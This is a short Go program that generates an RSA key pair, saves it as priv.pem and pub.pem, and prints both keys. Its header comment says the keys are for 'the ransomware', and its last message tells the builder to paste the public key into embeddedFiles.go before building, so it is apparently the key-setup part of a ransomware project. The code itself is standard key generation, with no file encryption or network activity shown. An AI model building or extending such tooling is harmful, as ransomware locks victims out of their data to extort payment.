/*
Generate a public-private RSA key pair to use for the ransomware
*/

package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"os"
)

func main() {
	bitSize := 4096

	rsaKey, _ := rsa.GenerateKey(rand.Reader, bitSize)

	fmt.Printf("Public key: %x\n", rsaKey.PublicKey)
	fmt.Printf("Private key: %x\n", rsaKey.D)

	pemdata := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(rsaKey),
		},
	)

	f, _ := os.Create("priv.pem")
	f.Write(pemdata)
	defer f.Close()
	fmt.Println("Private key saved to priv.pem")

	pubBytes := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PUBLIC KEY",
		Bytes: x509.MarshalPKCS1PublicKey(&rsaKey.PublicKey),
	})

	fp, _ := os.Create("pub.pem")
	fp.Write(pubBytes)
	defer fp.Close()
	fmt.Println("Public key saved to pub.pem")
	fmt.Println("Copy the pub.pem contents to publicKey in embeddedFiles.go before building.")
}
